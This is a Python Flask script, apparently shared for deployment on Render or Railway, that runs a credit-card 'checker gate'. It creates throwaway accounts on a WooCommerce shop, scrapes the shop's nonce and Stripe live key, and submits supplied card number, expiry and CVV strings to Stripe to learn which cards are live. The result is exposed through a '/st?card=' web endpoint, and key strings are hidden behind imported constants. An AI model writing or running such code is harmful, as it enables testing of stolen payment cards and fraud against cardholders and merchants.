# main.py → Direkt Render'a at, çalışır
from flask import Flask, request
import asyncio

app = Flask(__name__)

# ===================== SENİN KODUN BAŞLIYOR =====================
import aiohttp
import random
import re
from ifor import *
from idor import *

async def alii(sessoin, url, headers):
    async with sessoin.get(url, headers=headers) as rr:
        hh = await rr.text()
        nonce = hh.split('name="woocommerce-register-nonce" value="')[1].split('"')[0]
        return nonce

async def reg(sessoin, url, email, headers, nonce):
    async with sessoin.post(url, headers=headers, data={
        EM: email, UG: KU, NO: nonce, WP: KM, RE: KR,
    }) as rr:
        return await rr.text()

async def pkl(sessoin, url, headers):
    await asyncio.sleep(3)
    async with sessoin.get(url + KD, headers=headers) as rr:
        none = await rr.text()
        B11HB = none.split('"createAndConfirmSetupIntentNonce":"')[1].split('"')[0]
        pk_live_match = re.search(r'(pk_live_[A-Za-z0-9_-]+)', none)
        pk_live = pk_live_match.group(1) if pk_live_match else ''
        return B11HB, pk_live

async def Pymnt(sessoin, pk_live, payment_user_agent, P):
    n = P.split('|')[0]
    mm = P.split('|')[1]
    yy = P.split('|')[2][-2:]
    cvc = P.split('|')[3].replace('\n', '')
    P = P.replace('\n', '')
    har = { AU: IP, AC: JS, CA: FK, CO: IA, OR: HX, PR: HW, RF: HX + HK, SE: CH,
            SE + SC: FZ, SE + SH: AZ, SF + DE: MZ, SF + MO: CZ, SF + SI: OZ, US: KU }
    data = TY + ES + CR + AN + CR + NU + ES + n + AN + CR + CV + ES + cvc + AN + CR + EY + ES + yy + AN + CR + EQ + ES + mm + AN + AL + ES + UN + AN + BL + AX + RZ + ES + WL + AN + BL + AX + CX + ES + CN + AN + PX + ES + payment_user_agent + AN + KY + ES + pk_live
    async with sessoin.post(TZ, headers=har, data=data) as rr:
        try:
            aa = await rr.json()
            idi = aa.get('id')
            if not idi:
                return LX
            return idi
        except Exception:
            return LX

async def chkeot(sessoin, url, headers, B11HB, idi):
    async with sessoin.post(UR, headers=headers, data={
        JX: JK, VX: idi, VR: CR, AJ: B11HB
    }, params={JB: JU}) as rr:
        try:
            r5r = await rr.json()
            r5 = await rr.text()
            if LX in r5:
                return LX
            elif RD in r5 or RX in r5:
                return NS
            elif LZ in r5:
                return LZ
            else:
                return r5r.get('data', {}).get('error', {}).get('message', r5)
        except:
            return LX

async def scc20(card: str):
    url = UR + KM
    email = f"useroppqjuid{random.randint(1000,9999)}@gmail.com"
    payment_user_agent = LT
    headers = {SE: CH, SE + SC: FZ, SE + SH: AZ, SF + DE: EL, SF + MO: LQ, SF + SI: LI, SF + UI: FZ, GT: LF, US: KU}
    async with aiohttp.ClientSession() as sessoin:
        try:
            nonce = await alii(sessoin, url, headers)
            await reg(sessoin, url, email, headers, nonce)
            B11HB, pk_live = await pkl(sessoin, url, headers)
            idi = await Pymnt(sessoin, pk_live, payment_user_agent, card)
            result = await chkeot(sessoin, url, headers, B11HB, idi)
            return result
        except Exception as e:
            return f'Error: {e}'
# ===================== SENİN KODUN BİTTİ =====================

# ===================== FLASK URL =====================
@app.route('/st')
async def gate():
    card = request.args.get('card')
    if not card:
        return "card=?card=1234567890123456|12|27|123"
    
    result = await scc20(card.strip())
    return result

@app.route('/')
def ana():
    return "<h2>SCC20 Gate Aktif</h2>/scc20?card=NUM|MM|YY|CVV"

# st.py – en alta bunu koy (diğer her şey aynı kalsın)

if __name__ == "__main__":
    import os
    port = int(os.environ.get("PORT", 10000))  # Railway PORT'u otomatik alır
    app.run(host='0.0.0.0', port=port, debug=False)
